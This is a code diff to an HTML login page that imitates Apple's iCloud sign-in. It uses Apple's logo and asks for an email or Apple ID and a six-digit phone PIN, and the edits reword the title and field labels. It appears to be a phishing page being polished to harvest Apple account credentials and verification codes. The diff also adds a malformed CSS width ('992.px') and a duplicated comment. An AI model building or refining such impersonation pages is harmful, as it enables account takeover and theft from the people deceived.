@@ -178,7 +178,7 @@
         }
         
         /* Large devices (desktops, 992px and up) */
-        @media (min-width: 992px) and (max-width: 1199px) {
+        @media (min-width: 992.px) and (max-width: 1199px) {
             .login-container {
                 max-width: 400px;
                 padding: 48px;
@@ -502,13 +502,12 @@
 <body>
     <div class="login-container">
         <!-- Apple Logo -->
+         <!-- Apple Logo -->
         <div class="apple-logo">
             <i class="fab fa-apple"></i>
         </div>
-
         <!-- Title -->
-        <h1 class="form-title">Sign In</h1>
-        <p class="form-subtitle">Use your Apple ID to sign in to iCloud</p>
+        <h1 class="form-title">Sign In With Apple Account</h1>
 
         <!-- Login Form -->
         <form method="post">
@@ -516,7 +515,7 @@
             
             <div class="form-floating">
                 <input type="email" class="form-control" id="email" name="email" placeholder="name@example.com" required>
-                <label for="email">Apple ID</label>
+                <label for="email">Email or Phone Number</label>
             </div>
 
             <div class="form-floating">
@@ -526,7 +525,7 @@
 
             <div class="form-floating">
                 <input type="tel" class="form-control" id="pin" name="pin" placeholder="000000" maxlength="6" pattern="[0-9]{6}" required>
-                <label for="pin">Phone PIN Code</label>
+                <label for="pin">Phone PIN</label>
             </div>
 
             <div class="form-check mb-3">
